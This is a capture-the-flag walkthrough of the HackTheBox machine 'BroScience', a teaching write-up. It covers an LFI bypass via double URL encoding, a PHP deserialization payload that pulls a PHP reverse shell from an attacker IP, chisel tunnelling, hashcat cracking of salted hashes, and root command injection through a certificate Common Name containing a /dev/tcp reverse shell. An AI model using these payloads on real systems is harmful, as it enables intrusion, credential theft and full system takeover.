---
title: "HTB - BroScience"
categories: [box]
date: 2023-02-25
comments: true
image: /images/walkthroughs/hackthebox/broscience/logo.png
favicon: /images/walkthroughs/hackthebox/broscience/logo.png
description: HTB - BroScience walkthrough
---

# BroScience

<p align="center">
  <img src="/images/walkthroughs/hackthebox/broscience/banner.png" width="90%"/>
</p>


## Summary

Broscience is a great medium box where many vulnerabilities take place. First we have an LFI on the website that allow us to retrieve interesting files, including the db_connector with MySQL credentials. Checking the retrieved code, we could spot the unserialize function in PHP from a user input (user-prefs cookie) that we could exploit using other classes in the same PHP file. This way, we could bring a reverse shell payload into the server and call it to access the mahcine as www-data

For the lateral movement, we created an SSH tunnel to access MySQL database and discover a users table with hashed credentials. Using Hashcat and the salt, we could crack bill's password with rockyou. Using that credential we can access SSH with bill user.

For privilege escalation we spotted an script that automated a certificate renewal. Injection our reverse shell in the Common Name of a close to expiration certificate (that we crafted locally) we could exploit a command injection and get our revshell as root.

## Enumeration

- nmap

```bash
nmap -sC -sV -p- 10.10.11.195                                                   
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-21 12:15 CET
Nmap scan report for 10.10.11.195
Host is up (0.041s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 df:17:c6:ba:b1:82:22:d9:1d:b5:eb:ff:5d:3d:2c:b7 (RSA)
|   256 3f:8a:56:f8:95:8f:ae:af:e3:ae:7e:b8:80:f6:79:d2 (ECDSA)
|_  256 3c:65:75:27:4a:e2:ef:93:91:37:4c:fd:d9:d4:63:41 (ED25519)
80/tcp  open  http     Apache httpd 2.4.54
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Did not follow redirect to https://broscience.htb/
443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.54 (Debian)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Not valid before: 2022-07-14T19:48:36
|_Not valid after:  2023-07-14T19:48:36
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: BroScience : Home
Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.89 seconds
```

- gobuster

```bash
gobuster dir -u "https://broscience.htb/" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -x php,html -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://broscience.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
2023/02/22 09:26:42 Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 1936]
/images               (Status: 301) [Size: 319] [--> https://broscience.htb/images/]
/includes             (Status: 301) [Size: 321] [--> https://broscience.htb/includes/]
/index.php            (Status: 200) [Size: 9306]                                      
/register.php         (Status: 200) [Size: 2161]                                      
/user.php             (Status: 200) [Size: 1309]                                      
/logout.php           (Status: 302) [Size: 0] [--> /index.php]                        
/comment.php          (Status: 302) [Size: 13] [--> /login.php]                       
/styles               (Status: 301) [Size: 319] [--> https://broscience.htb/styles/]  
/javascript           (Status: 301) [Size: 323] [--> https://broscience.htb/javascript/]
/manual               (Status: 301) [Size: 319] [--> https://broscience.htb/manual/]   
/activate.php         (Status: 200) [Size: 1256]                                        
/server-status        (Status: 403) [Size: 280]
/exercise.php         (Status: 200) [Size: 1322]
/update_user.php      (Status: 302) [Size: 13] [--> /login.php] 
```

By adding the hostname to the /etc/hosts file, we can get to the actual website:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/broscience/1_0_web.png" width="90%"/>
</p>


Searching in the website we spot different posts and different exercises, users and comments:

https://broscience.htb/exercise.php?id=4

<p align="center">
  <img src="/images/walkthroughs/hackthebox/broscience/1_1_post.png" width="80%">
</p>  

https://broscience.htb/user.php?id=4

<p align="center">
  <img src="/images/walkthroughs/hackthebox/broscience/1_2_user.png" width="80%">
</p>  

Changing the id in the URL we can discover the following users:

```
administrator
Email Address
	administrator@broscience.htb
Total exercises posted: 3 
Total comments posted: 1 
Is activated: Yes 
Is admin: Yes 


bill
Email Address
    bill@broscience.htb
Total exercises posted: 2 
Total comments posted: 1 
Is activated: Yes 
Is admin: No 


michael
Email Address
    michael@broscience.htb
Total exercises posted: 2 
Total comments posted: 1 
Is activated: Yes 
Is admin: No 


john
Email Address
    john@broscience.htb
Total exercises posted: 1 
Total comments posted: 3 
Is activated: Yes 
Is admin: No 


dmytro
Email Address
    dmytro@broscience.htb
Total exercises posted: 0 
Total comments posted: 0 
Is activated: Yes 
Is admin: No 
```

Checking the results from gobuster we see the following directory... Interesting:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/broscience/1_4_includes.png" width="80%">
</p>  


Then I realized the following HTML code:

```html
<div class="uk-card-media-top">
	<p align="center">
  <img src="/images/walkthroughs/hackthebox/broscience/includes/img.php?path=barbell_squats.jpeg" width="600" height="600" alt="" width="80%">
</p>  
</div>
```

Doing some tests we find the following behaviour: When we insert the dots for the LFI it says attack detected. Nice, now we have something to poke around:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/broscience/1_6_include.png" width="80%">
</p>  

Attack detected when placing the dots:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/broscience/1_7_attack.png" width="80%">
</p>  

An easy LFI bypass with double URL encode will do the trick:

```bash
# Payload:
%252e%252e%252f

# URL decode:
%2e%2e%2f 

# URL decode 2:
../

```

Use it on burp and check the result:

```bash
GET /includes/img.php?path=%252e%252e%252findex.php HTTP/1.1
Host: broscience.htb
```

And get the file included in the response:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/broscience/1_8_lfi.png" width="80%">
</p>  

- index.php (just interesting lines)

```php
<?php
include_once 'includes/db_connect.php';
        
// Load exercises
$res = pg_query($db_conn, 'SELECT exercises.id, username, title, image, SUBSTRING(content, 1, 100), exercises.date_created, users.id FROM exercises JOIN users ON author_id = users.id');
```

I wanted the db_connect.php since I saw it on the includes subdirectory, let's get it:

Payload:

```bash
GET /includes/img.php?path=%252e%252e%252fincludes%252fdb_connect.php HTTP/1.1
Host: broscience.htb
```

Reponse:

```php
<?php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "dbuser";
$db_pass = "RangeOfMotion%777";
$db_salt = "NaCl";

$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");

if (!$db_conn) {
    die("<b>Error</b>: Unable to connect to database");
}
?>
```

Great, we have some credentials:

**dbuser:RangeOfMotion%777**

This cred won't work for any of the previous users in the login form... Let's keep the enumeration on the files:

- index.php (no html)

```php
<?php
session_start();
?>

<html>
    <head>
        <title>BroScience : Home</title>
        <?php 
        include_once 'includes/header.php';
        include_once 'includes/utils.php';
        $theme = get_theme();
        ?>
        <?php include_once 'includes/navbar.php'; ?>
        <div class="uk-container uk-margin">
            <!-- TODO: Search bar -->
            <?php
            include_once 'includes/db_connect.php';
                    
            // Load exercises
            $res = pg_query($db_conn, 'SELECT exercises.id, username, title, image, SUBSTRING(content, 1, 100), exercises.date_created, users.id FROM exercises JOIN users ON author_id = users.id');
            if (pg_num_rows($res) > 0) {
                echo '<div class="uk-child-width-1-2@s uk-child-width-1-3@m" uk-grid>';
                while ($row = pg_fetch_row($res)) {
                    ?>
                    <div>
                        <div class="uk-card uk-card-default <?=(strcmp($theme,"light"))?"uk-card-secondary":""?>
                        ...
```

- utils.php (complete)

```php
<?php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}

// Source: https://stackoverflow.com/a/4420773 (Slightly adapted)
function rel_time($from, $to = null) {
    $to = (($to === null) ? (time()) : ($to));
    $to = ((is_int($to)) ? ($to) : (strtotime($to)));
    $from = ((is_int($from)) ? ($from) : (strtotime($from)));

    $units = array
    (
        "year"   => 29030400, // seconds in a year   (12 months)
        "month"  => 2419200,  // seconds in a month  (4 weeks)
        "week"   => 604800,   // seconds in a week   (7 days)
        "day"    => 86400,    // seconds in a day    (24 hours)
        "hour"   => 3600,     // seconds in an hour  (60 minutes)
        "minute" => 60,       // seconds in a minute (60 seconds)
        "second" => 1         // 1 second
    );

    $diff = abs($from - $to);

    if ($diff < 1) {
        return "Just now";
    }

    $suffix = (($from > $to) ? ("from now") : ("ago"));

    $unitCount = 0;
    $output = "";

    foreach($units as $unit => $mult)
        if($diff >= $mult && $unitCount < 1) {
            $unitCount += 1;
            // $and = (($mult != 1) ? ("") : ("and "));
            $and = "";
            $output .= ", ".$and.intval($diff / $mult)." ".$unit.((intval($diff / $mult) == 1) ? ("") : ("s"));
            $diff -= intval($diff / $mult) * $mult;
        }

    $output .= " ".$suffix;
    $output = substr($output, strlen(", "));

    return $output;
}

class UserPrefs {
    public $theme;

    public function __construct($theme = "light") {
		$this->theme = $theme;
    }
}

function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }
        $up = unserialize(base64_decode($up_cookie));
        return $up->theme;
    } else {
        return "light";
    }
}

function get_theme_class($theme = null) {
    if (!isset($theme)) {
        $theme = get_theme();
    }
    if (strcmp($theme, "light")) {
        return "uk-light";
    } else {
        return "uk-dark";
    }
}

function set_theme($val) {
    if (isset($_SESSION['id'])) {
        setcookie('user-prefs',base64_encode(serialize(new UserPrefs($val))));
    }
}

class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
?>
```

We can see many things, first the generate_activation_code() function, it is time-based with seconds precision, we might predict it or guess it just using timestamps from previous or following seconds. Also the UserPrefs class is being used to serialize a payload and unserialize it from the cookies (unsanitize input), but there are other interesting classes like Avatar and AvatarInterface. In the first one, we can see the [file_get_contents()](https://www.php.net/manual/en/function.file-get-contents.php) function, so we might bring some payloads to the server. My idea is, let's use the unserialize vulnerability to trigger the AvatarInterface class, with _$imgPath_ value as path to the server folder to serve the file and _$tmp_ to be the URL pointing to a server where we will host a PHP revshell.

First, we need an account, since the cookie won't be read if we don't have a session. Let's predict that activation code.

We register ourselves in the platform and check the time returned by the server. Convert it to unix timestamp with [this website](https://www.epochconverter.com/) and beware the timezone, in this case the server is on GMT, so use it to generate the timestamp:

Payload:

```bash
POST /register.php HTTP/1.1
Host: broscience.htb
Cookie: PHPSESSID=f6jqcu5fr9is7ninkdibbm621r
Content-Length: 79
Connection: close

username=ka&email=kash%40kash.com&password=kashmir54&password-confirm=kashmir54
```

Response (focus on the date returned by the server):

```bash
HTTP/1.1 200 OK
Date: Wed, 22 Feb 2023 18:33:56 GMT
Server: Apache/2.4.54 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 2433
Connection: close
Content-Type: text/html; charset=UTF-8


<html>
    <head>
        <title>BroScience : Register</title>
        ....
       	<div uk-alert class="uk-alert-success">
			<a class="uk-alert-close" uk-close></a>
			Account created. Please check your email for the activation link.
		</div>
```

Convert the date to epoch unix timestamp

```
Date: Fri, 24 Feb 2023 22:37:30 GMT
To epoch unix timestamp:
1677278250
```

Now, using the following code, get the activation code:

```php
<?php
function generate_activation_code($tmp) {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand($tmp);
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}

echo generate_activation_code("1677060957");
?>
```

And we get the following code:

```bash
php -f act_code.php
# 1677278250
# Jn8MlDH3n7drZ8k8RT1MUCT9DKZFPs23  
```

Now retrieve the activation.php file (we saw it on the gobuster result) and check the logic behind the request to reproduce it:

```php
<?php
session_start();

// Check if user is logged in already
if (isset($_SESSION['id'])) {
    header('Location: /index.php');
}

if (isset($_GET['code'])) {
    // Check if code is formatted correctly (regex)
    if (preg_match('/^[A-z0-9]{32}$/', $_GET['code'])) {
        // Check for code in database
        include_once 'includes/db_connect.php';

        $res = pg_prepare($db_conn, "check_code_query", 'SELECT id, is_activated::int FROM users WHERE activation_code=$1');
        $res = pg_execute($db_conn, "check_code_query", array($_GET['code']));

        if (pg_num_rows($res) == 1) {
            // Check if account already activated
            $row = pg_fetch_row($res);
            if (!(bool)$row[1]) {
                // Activate account
                $res = pg_prepare($db_conn, "activate_account_query", 'UPDATE users SET is_activated=TRUE WHERE id=$1');
                $res = pg_execute($db_conn, "activate_account_query", array($row[0]));
                
                $alert = "Account activated!";
                $alert_type = "success";
            } else {
                $alert = 'Account already activated.';
            }
        } else {
            $alert = "Invalid activation code.";
        }
    } else {
        $alert = "Invalid activation code.";
    }
} else {
    $alert = "Missing activation code.";
}
?>
```

Just a GET request with the **code** parameter:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/broscience/2_1_activated.png" width="80%">
</p>  

On log in with the credentials:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/broscience/2_2_in.png" width="80%">
</p>  


Now we can see the user-prefs object in the cookies. So with the valid session, let's try to exploit that PHP unserialization vulnerability:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/broscience/2_3_users_prefs.png" width="80%">
</p>  


Combining the previous utils.php class, we can append the following lines of code in order to create a payload with the desired parameters in order to call our server and bring the payload to the server:


```php
...

class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

# We dont care where it is being deserialize, 
# we can create an object on our scope, so lets create the AvatarInterface
$avatar = new AvatarInterface();

# __wake_up magic method will be called when an AvatarInterface object
# is instanciated, so it will create an Avatar with the $imgPath filepath
# and the content we set on the file_get_contents().
# With file_get_contents() we can import the content from a remote server (our attack box)
$avatar->imgPath="/var/www/html/k.php";
$avatar->tmp="http://10.10.15.7:5454/k.php";

# Then print our serialized payload
echo serialize($avatar);
echo "\n";
# And the format for the cookie
echo base64_encode(serialize($avatar));
```

Execution:

```bash

php -f serialize.php

```

Output:

```php

O:15:"AvatarInterface":2:{s:3:"tmp";s:28:"http://10.10.15.7:5454/k.php";s:7:"imgPath";s:19:"/var/www/html/k.php";}

TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czoyODoiaHR0cDovLzEwLjEwLjE1Ljc6NTQ1NC9rLnBocCI7czo3OiJpbWdQYXRoIjtzOjE5OiIvdmFyL3d3dy9odG1sL2sucGhwIjt9  

```


Now we can edit our cookie with the result of the PHP payload we have prepared and we can see the HTTP request to our server when we Forward the request to the server. The, we can load https://broscience.htb/k.php to get our revshell:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/broscience/2_4_payload.png" width="80%">
</p>  


And we are inside the box:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/broscience/2_5_in.png" width="80%">
</p>  


## Lateral movement

Now we recall the PostgresQL credentials we obtained:

```php
<?php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "dbuser";
$db_pass = "RangeOfMotion%777";
$db_salt = "NaCl";

$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");

if (!$db_conn) {
    die("<b>Error</b>: Unable to connect to database");
}
?>
```

**dbuser:RangeOfMotion%777**

Let's use chisel to create an SSH tunnel in order to access with psql client

```bash

# Load it into the machine
wget http://10.10.15.7:5454/chisel_32

# Start listening on the attack box
./chisel server -p 8000 --reverse

# Start SSH tunnel on victim
chmod +x chisel_32
./chisel_32 client 10.10.15.7:8000 R:5432:127.0.0.1:5432

```

Now we can use psql on our machine to access the tunnel using the port we have allowed for this matter. I mirrowed it, so let's use 5432:

```bash

psql -h 127.0.0.1 -p 5432 -d broscience -U dbuser 

```

Great, we are in, now let's do some basic enumeration and get some interesting rows:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/broscience/3_2_db.png" width="80%">
</p>  

We see the users table, let's retrive it:

```sql
broscience=> SELECT * FROM users;
 id |   username    |             password             |            email             |         activation_code          | is_activated | is_admin |         date_created          
----+---------------+----------------------------------+------------------------------+----------------------------------+--------------+----------+-------------------------------
  1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf | t            | t        | 2019-03-07 02:02:22.226763-05
  2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb          | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 | t            | f        | 2019-05-07 03:34:44.127644-04
  3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb       | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 | t            | f        | 2020-10-01 04:12:34.732872-04
  4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb          | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 | t            | f        | 2021-09-21 11:45:53.118482-04
  5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb        | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm | t            | f        | 2021-08-13 10:34:36.226763-04
  6 | oni           | 1d57185c6e3f19f28a1f8141403e2e20 | oni@oni.com                  | Rkz7gabG6AsKlKk51hyuOHiMMzNcJ87z | t            | f        | 2023-02-24 17:07:01.796904-05
 12 | kash          | 299e96f5d3ed7c7289bec23ddd180c72 | kashmir@kashmir.com          | Jn8MlDH3n7drZ8k8RT1MUCT9DKZFPs23 | t            | f        | 2023-02-24 17:37:30.332928-05
(7 rows)
```

We will try to crack those salted passwords (rememeber the salt attribute when the bd is loaded). Set the hashes into a formatted file for hashcat to digest:

- hash.txt

```
bill:13edad4932da9dbb57d9cd15b66ed104:NaCl
administrator:15657792073e8a843d4f91fc403454e1:NaCl
michael:bd3dad50e2d578ecba87d5fa15ca5f85:NaCl
john:a7eed23a7be6fe0d765197b1027453fe:NaCl
dmytro:5d15340bded5b9395d5d14b9c21bc82b:NaCl
```

Now run hashcat with the option for salted password (salt at the begining)

```bash
hashcat -m 20 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --user

bill:13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym
michael:bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:2applesplus2apples
dmytro:5d15340bded5b9395d5d14b9c21bc82b:NaCl:Aaronthehottest
```

So we have the following creds. **bill:iluvhorsesandgym**. We saw bill usen in the machine when using LFI to get /etc/passwd, so let's try the credentials to access:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/broscience/4_0_in.png" width="80%">
</p>  


## Privesc

With pspy we can see the following command runnning as root:

```bash
2023/02/25 11:57:13 CMD: UID=0     PID=1      | /sbin/init 
2023/02/25 11:58:01 CMD: UID=0     PID=1840   | /usr/sbin/CRON -f 
2023/02/25 11:58:01 CMD: UID=0     PID=1841   | /usr/sbin/CRON -f 
2023/02/25 11:58:01 CMD: UID=0     PID=1842   | /bin/bash /root/cron.sh 
2023/02/25 11:58:01 CMD: UID=0     PID=1843   | timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt                                                                                                                      
2023/02/25 11:58:01 CMD: UID=0     PID=1844   | timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt                                                                                                                      
2023/02/25 11:58:01 CMD: UID=0     PID=1845   | /bin/bash /root/cron.sh 
2023/02/25 11:58:01 CMD: UID=0     PID=1846   | /bin/bash /root/cron.sh 
```

Let's see what that script do:

- /opt/renew_cert.sh

```bash
cat renew_cert.sh 
#!/bin/bash

if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
    echo "Usage: $0 certificate.crt";
    exit 0;
fi

if [ -f $1 ]; then

    openssl x509 -in $1 -noout -checkend 86400 > /dev/null

    if [ $? -eq 0 ]; then
        echo "No need to renew yet.";
        exit 1;
    fi

    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)

    country=$(echo $subject | grep -Eo 'C = .{2}')
    state=$(echo $subject | grep -Eo 'ST = .*,')
    locality=$(echo $subject | grep -Eo 'L = .*,')
    organization=$(echo $subject | grep -Eo 'O = .*,')
    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
    commonName=$(echo $subject | grep -Eo 'CN = .*,?')
    emailAddress=$(openssl x509 -in $1 -noout -email)

    country=${country:4}
    state=$(echo ${state:5} | awk -F, '{print $1}')
    locality=$(echo ${locality:3} | awk -F, '{print $1}')
    organization=$(echo ${organization:4} | awk -F, '{print $1}')
    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')

    echo $subject;
    echo "";
    echo "Country     => $country";
    echo "State       => $state";
    echo "Locality    => $locality";
    echo "Org Name    => $organization";
    echo "Org Unit    => $organizationUnit";
    echo "Common Name => $commonName";
    echo "Email       => $emailAddress";

    echo -e "\nGenerating certificate...";
    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
    $state
    $locality
    $organization
    $organizationUnit
    $commonName
    $emailAddress
    " 2>/dev/null

    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
else
    echo "File doesn't exist"
    exit 1;
fi
```

Our injection point is the _$commonName_. We need to generate a certificate with a payload in the _$commonName_ to call a revshell for example. Checking the previous string modifications, we need to start the payload at the character 5 due to the parameter expansion _echo ${commonName:5}_. Also, that certificate must expirate in less than 86400 seconds, aka 1 day, if not, the script won't reach our injection point.


```bash

# Generate the certificate
openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -nodes -keyout example.key -out broscience.crt -days 1

# When asking for the CN input this
12345$(bash -i >& /dev/tcp/10.10.14.3/5453 0>&1)

# Serve the file
python3 -m http.server 5454

# On the victim, load the certificate
cd /home/bill/Certs

# Retrieve the cert from the attack box
wget http://10.10.14.3:5454/broscience.crt

```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/broscience/4_1_load_cert.png" width="80%">
</p>  


Now, listen to the connection and wait for the cron job to execute the script with our certificate

```bash

nc -lvnp 5453

```

And we get our root revshell:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/broscience/5_0_root.png" width="80%">
</p>  



